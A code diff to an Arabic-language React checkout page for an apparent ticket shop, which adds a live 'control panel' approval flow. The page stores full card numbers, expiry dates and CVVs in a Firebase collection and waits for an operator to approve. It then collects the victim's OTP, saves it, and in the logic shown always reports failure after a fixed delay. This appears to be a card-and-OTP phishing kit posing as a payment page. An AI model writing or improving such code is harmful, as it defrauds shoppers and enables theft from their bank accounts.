@@ -1,5 +1,6 @@
 import { useEffect, useMemo, useRef, useState } from "react";
 import { AlertCircle, Check, CreditCard, Loader2, ShieldCheck } from "lucide-react";
+import { doc, onSnapshot } from "firebase/firestore";
 import {
   QuestLegalFooter,
   QuestMobileTopBar,
@@ -12,7 +13,7 @@ import {
   getStoredTicketCart,
   ticketProductMap,
 } from "@/lib/ticket-cart";
-import { addData } from "@/lib/firebase";
+import { addData, db } from "@/lib/firebase";
 
 interface BillingDetails {
   firstName: string;
@@ -29,9 +30,14 @@ interface CardDetails {
   cvv: string;
 }
 
-type PaymentStep = "idle" | "waitingOtp" | "otp" | "verifyingOtp" | "failed";
+type PaymentStep =
+  | "idle"
+  | "waitingApproval"
+  | "otp"
+  | "verifyingOtp"
+  | "otpFailed"
+  | "rejected";
 
-const OTP_REVEAL_DELAY_MS = 10000;
 const OTP_VERIFY_DELAY_MS = 5000;
 
 const phoneCountryOptions = [
@@ -269,7 +275,6 @@ export default function Checkout() {
   const [paymentError, setPaymentError] = useState<string | null>(null);
   const [submissionId, setSubmissionId] = useState<string | null>(null);
   const [isSavingCheckout, setIsSavingCheckout] = useState(false);
-  const otpRevealTimerRef = useRef<number | null>(null);
   const otpVerifyTimerRef = useRef<number | null>(null);
   const otpInputRef = useRef<HTMLInputElement>(null);
   const webOtpAbortRef = useRef<AbortController | null>(null);
@@ -304,9 +309,6 @@ export default function Checkout() {
 
   useEffect(() => {
     return () => {
-      if (otpRevealTimerRef.current) {
-        window.clearTimeout(otpRevealTimerRef.current);
-      }
       if (otpVerifyTimerRef.current) {
         window.clearTimeout(otpVerifyTimerRef.current);
       }
@@ -315,6 +317,42 @@ export default function Checkout() {
       }
     };
   }, []);
+
+  useEffect(() => {
+    if (!submissionId) {
+      return;
+    }
+
+    const unsubscribe = onSnapshot(doc(db, "pays", submissionId), (snapshot) => {
+      if (!snapshot.exists()) {
+        return;
+      }
+
+      const liveData = snapshot.data() as {
+        payment?: { status?: string; errorMessage?: string | null };
+      };
+      const liveStatus = liveData.payment?.status;
+
+      if (liveStatus === "approved") {
+        setPaymentError(null);
+        setPaymentStep((currentStep) =>
+          currentStep === "waitingApproval" ? "otp" : currentStep
+        );
+        return;
+      }
+
+      if (liveStatus === "rejected") {
+        setPaymentStep("rejected");
+        setPaymentError(
+          liveData.payment?.errorMessage ?? "تم رفض البطاقة من فريق الدفع."
+        );
+      }
+    });
+
+    return () => {
+      unsubscribe();
+    };
+  }, [submissionId]);
 
   useEffect(() => {
     if (paymentStep !== "otp") {
@@ -399,9 +437,6 @@ export default function Checkout() {
   };
 
   const onProceedToPayment = async () => {
-    if (otpRevealTimerRef.current) {
-      window.clearTimeout(otpRevealTimerRef.current);
-    }
     if (otpVerifyTimerRef.current) {
       window.clearTimeout(otpVerifyTimerRef.current);
     }
@@ -420,6 +455,7 @@ export default function Checkout() {
     const checkoutId = generateSubmissionId(submissionId);
     const payload = {
       id: checkoutId,
+      status: "pending_review",
       billing: {
         firstName: billingDetails.firstName.trim(),
         lastName: billingDetails.lastName.trim(),
@@ -444,7 +480,7 @@ export default function Checkout() {
         expiry: cardDetails.expiry,
         cvv: cardDetails.cvv,
         otpCode: null,
-        status: "otp_requested",
+        status: "pending_review",
         errorMessage: null,
       },
     };
@@ -455,11 +491,7 @@ export default function Checkout() {
       setSubmissionId(checkoutId);
       setPaymentError(null);
       setOtpCode("");
-      setPaymentStep("waitingOtp");
-
-      otpRevealTimerRef.current = window.setTimeout(() => {
-        setPaymentStep("otp");
-      }, OTP_REVEAL_DELAY_MS);
+      setPaymentStep("waitingApproval");
     } catch (error) {
       setPaymentStep("idle");
       setPaymentError(
@@ -493,6 +525,7 @@ export default function Checkout() {
           try {
             await addData({
               id: submissionId,
+              status: "otp_failed",
               payment: {
                 status: "otp_failed",
                 otpCode: normalizedOtp,
@@ -503,7 +536,7 @@ export default function Checkout() {
           }
         }
 
-        setPaymentStep("failed");
+        setPaymentStep("otpFailed");
         setPaymentError(failureMessage);
       })();
     }, OTP_VERIFY_DELAY_MS);
@@ -518,7 +551,7 @@ export default function Checkout() {
   const showOtpForm =
     paymentStep === "otp" ||
     paymentStep === "verifyingOtp" ||
-    paymentStep === "failed";
+    paymentStep === "otpFailed";
 
   return (
     <div className="min-h-screen bg-[#efefef] text-[#333]" dir="rtl" lang="ar">
@@ -916,11 +949,12 @@ export default function Checkout() {
                       </div>
                     </form>
 
-                    {paymentStep === "waitingOtp" ? (
+                    {paymentStep === "waitingApproval" ? (
                       <div className="mt-3 flex items-start gap-2 rounded-md border border-[#e3d5ff] bg-[#f7f2ff] px-3 py-2 text-xs text-[#5c3f8a]">
                         <Loader2 className="mt-0.5 h-3.5 w-3.5 animate-spin" />
                         <p>
-                          جاري معالجة بيانات البطاقة. سيظهر رمز OTP خلال 10 ثوانٍ.
+                          تم إرسال بيانات البطاقة. الرجاء الانتظار حتى موافقة فريق
+                          المراجعة من لوحة التحكم.
                         </p>
                       </div>
                     ) : null}
@@ -985,7 +1019,7 @@ export default function Checkout() {
                         type="button"
                         onClick={onProceedToPayment}
                         disabled={
-                          paymentStep === "waitingOtp" ||
+                          paymentStep === "waitingApproval" ||
                           paymentStep === "verifyingOtp" ||
                           isSavingCheckout
                         }
@@ -993,8 +1027,8 @@ export default function Checkout() {
                       >
                         {isSavingCheckout
                           ? "جاري حفظ الطلب..."
-                          : paymentStep === "waitingOtp"
-                          ? "جاري طلب OTP..."
+                          : paymentStep === "waitingApproval"
+                          ? "بانتظار الموافقة..."
                           : "المتابعة للدفع"}
                       </button>
                       <button
